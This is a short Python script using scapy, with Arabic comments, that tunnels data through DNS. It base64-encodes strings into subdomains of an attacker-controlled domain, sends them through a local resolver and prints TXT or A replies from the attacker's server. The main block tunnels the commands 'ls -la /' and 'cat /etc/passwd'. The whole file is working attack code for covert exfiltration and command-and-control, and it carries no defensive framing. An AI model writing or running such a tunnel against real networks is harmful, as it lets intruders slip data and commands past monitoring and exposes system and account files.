
from scapy.all import IP, UDP, DNS, DNSQR, sr1
import base64
import time

# الهدف: سيرفر DNS المحلي الذي يعيد توجيه الطلبات الخارجية
TARGET_DNS_RESOLVER = "172.18.0.1" 
# النطاق الذي يملكه المهاجم (يجب أن يشير إلى سيرفر DNS خاص بالمهاجم)
ATTACKER_CONTROLLED_DOMAIN = "example.attacker.com" # استبدل بهذا نطاقك الحقيقي

def encode_payload(data):
    """ترميز البيانات باستخدام Base64 لجعلها آمنة لأسماء النطاقات"""
    encoded_data = base64.b64encode(data.encode()).decode().replace('=', '').replace('/', '_').replace('+', '-')
    return encoded_data

def send_dns_tunnel_request(payload_data):
    """
    يرسل بيانات مغلفة كاستعلام DNS إلى سيرفر DNS المستهدف.
    البيانات يتم ترميزها كجزء من النطاق الفرعي.
    """
    encoded_payload = encode_payload(payload_data)
    
    # بناء اسم النطاق الفرعي الذي يحمل الحمولة
    subdomain_payload = f"{encoded_payload}.{ATTACKER_CONTROLLED_DOMAIN}"
    
    print(f"[*] Crafting DNS query for subdomain: {subdomain_payload}")
    
    # إنشاء حزمة DNS: IP -> UDP -> DNS query
    dns_query = IP(dst=TARGET_DNS_RESOLVER) / \
                UDP(dport=53) / \
                DNS(rd=1, qd=DNSQR(qname=subdomain_payload, qtype="A"))
    
    print(f"[*] Sending DNS request to {TARGET_DNS_RESOLVER}...")
    
    # إرسال الحزمة وانتظار الاستجابة (timeout 5 ثواني)
    # verbose=0 لمنع scapy من طباعة معلومات تفصيلية غير ضرورية
    response = sr1(dns_query, timeout=5, verbose=0)
    
    if response and response.haslayer(DNS):
        print(f"[+] DNS response received from {response.src}!")
        if response[DNS].ancount > 0:
            for i in range(response[DNS].ancount):
                # هنا يمكن استخراج الرد من سيرفر المهاجم (عادة سجل TXT)
                if response[DNS].an[i].type == 16: # TXT record
                    print(f"    [+] Attacker's server response (TXT): {response[DNS].an[i].rdata.decode()}")
                elif response[DNS].an[i].type == 1: # A record
                    print(f"    [+] Attacker's server response (A): {response[DNS].an[i].rdata}")
        else:
            print("[-] No specific answer records from attacker's server, but request was sent.")
    else:
        print("[-] No DNS response received or request timed out.")

if __name__ == "__main__":
    # مثال على أمر أو بيانات تريد إرسالها سراً
    command_to_send = "ls -la /" 
    print(f"[+] Attempting to tunnel command: '{command_to_send}'")
    send_dns_tunnel_request(command_to_send)

    time.sleep(1) # تأخير بسيط
    
    command_to_send_2 = "cat /etc/passwd"
    print(f"\n[+] Attempting to tunnel another command: '{command_to_send_2}'")
    send_dns_tunnel_request(command_to_send_2)
